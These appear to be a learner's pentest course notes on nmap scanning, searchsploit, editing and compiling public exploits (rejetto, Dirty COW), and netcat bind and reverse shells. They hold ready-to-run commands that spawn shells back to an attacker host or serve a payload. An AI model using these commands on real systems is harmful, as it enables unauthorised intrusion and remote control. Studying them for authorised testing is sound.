Note: Alot of exploits are found in the other folders too so dont rely on this alone

## Intro

1. Vuln scanning
2. Exploit searching
3. Fixing exploits
4. Bind & reverse shells
5. Exploit Frameworks
6. Windows exploit
7. Linux exploit
8. AV Evasion and Obfuscation


# Vuln scanning
### banner grabbing
- can get service info

Demo:
Some nmap script
`ls -al /usr/share/nmap/scripts/ | grep banner`
`nmap -sV --script=banner <ip>` -> done in -sV

`nc <ip>` -> same stuff but sometimes nmap sV dont work

### nmap scripts
Demo:
`ls -al /usr/share/nmap/scripts |grep http` -> limit to only http scripts

See the documentation on scripts
`nano /usr/share/nmap/scripts/http-enum.nse`

For this demo
`ls -al /usr/share/nmap/scripts |grep shellshock`

`nmap -sV <ip> --script=http-shellshock --script-args="http-shellshock.url=/gettime.cgi"`

### Metasploit

demo:
/smb/smb_ms17_010


## Searching for publicly available exploits

- get code from verified sources (anyone can set a github)
- epxloitDB / Rapid7 

#### ExploitDB
- maintained by a team from kali
- search types/platforms/authors/ports/tags(type of vuln) etc

#### Rapid7
- vetted. Same as before

#### Google Dorks it
- vsftpd site:rapid7.com

#### Data storm
- Info on latest news and new exploits etc

### Searchsploit
- locally available db for exploits
`sudo apt-get update && sudo apt-get install exploitdb -y`

Should update it frequently
`searchsploit -u`

Exploits stored here
`ls -al /usr/share/exploitdb`

`searchsploit vsftpd 2.3.4`
`searchsploit -m 49757` -> get info about the exploit and copies it to ur current dir

Filters like in the exploitdb site:
`searchsploit remote windwos smb`


Xtra:
`searchsploit -t vsftpd`
-> search in title

`searchsploit -e "Windows XP" | grep -e "Microsoft Windows XP"
-> exact match

`seachsploit remote windows smb -w | grep -e "EternalBlue"`
-> -w gives the online link to read more about each exploit


## Fixing exploits
- All publicly available exploits need to be edited to suite ur needs

Demo:
rejetto
`searchsploit rejetto`
`searchsploit -m <exploit id>`

Edit the exploit code to use (eg change ip/port)
`vim <exploit.py>`
This exploit needed nc.exe to be hosted on your local server to run on the target

Attacker
`cp /usr/share/windows-resources/binaries/nc.exe`
-> Copy it to the home directory to share 
`python -m SimpleHTTPServer 80`

Attacker (another terminal)
`nc -lvnp 1234`

Attacker (3rd terminal terminal)
`python 29161.py <targetip> 80`

Run a few times.should work
`systeminfo`


### Cross-compiling exploits
- need to compile C/C++ exploit code
- Using Linux to compile windows exploits (cross-compiling)

Demo:
For creating Microsoft Windows portable executables in linux
`sudo apt-get install mingw-w64`

For C code in Linux
`sudo apt-get install gcc`

Note: Better to get the 32bit exploits more compatible

#### If no documentation of how to compile
Compiles to a 64bit executable
`i686-w64-mingw32-gcc 9303.c -o exploit`

Compiles to a 32bit executable
`i686-w64-mingw32-gcc 9303.c -o exploit -lws2_32`

#### Dirty cow exploit
- Has good documentation on how to use/compile
`gcc -pthread 4089.c -o exploit -lcrypt`

Last:
github exploitdb-bin-sploits/bin-sploits has some precompiled binaries if needed


## Bind/Reverse Shells

## Netcat
- located in /usr/share/windows-binaries
- 2 modes:
	- Client mode: Connect to the target directly 
	- Server mode: Listen for connections from the target (-l)
`nc <ip>:<port>`
`nc -lvnp <port>`

Note: 
UDP also possible -u
-v verbose
-n no dns resolution (doesnt change the ip/name to something else)

Uses:
banner grabbing, reverse/bind shells, file transfers

Demo: 
- Chat terminal 
system1:
`nc -lvnp 80`

system2:
`nc -nv <system1 ip> 80`

Works in UDP too o.o but unreliable`
system1:
`nc -lvnup 80`

system2:
`nc -nvu <system1 ip> 80`

Transfer files
system2:
`nc - nv <sys1 ip> 80 < test.txt`


## Bindshells
- Attacker conect to a listener on the target 
Attacker ---(connection req)-----> Target Listener

- Listener can be set to exec /bin/bash or cmd.exe on the client when a client connects
`nc -lnvp 1234 -e cmd.exe`
`nc -lnvp 1234 -e /bin/bash`
`nc -lnvp 1234 -e /bin/sh` --> bash with less features can even use /bin/zsh

On linux
`nc -lnvp 1234 -c /bin/bash` --> can use -e also but c is reserved for linux?

- Attacker
`nc -nv <target ip> 1234` --> the shell should spawn


#### IMPT
- inbound traffic can be blocked by firewall preventing clients to connect (Reverse shell preferred)

Cool: 
`python -m SimpleHTTPServer 80` 
Files can be assesed using the web browser and show the files (basically a web file server) --> usually just curl/certutil/wget

## Reverse Shell
- Target connects to listener on the Attackers system
- IP of attacker is leaked oops

Good stuff:
- Not blocked by firewall
- Can use any sort of client to connect to the listener (can use bash/python/php/powershell script no need nc)
- ^ live off the land , if theres php use php if python use python etc


Attackers listener:
`nc -lnvp 1234`

Target connects as client and launch shell:
`nc -nv <attackers ip> 1234 -e cmd.exe`

## Reverseshell cheat sheet 
- get your payload (clients) to connect to a listener (attacker)

payloadallthings github
revshells.com







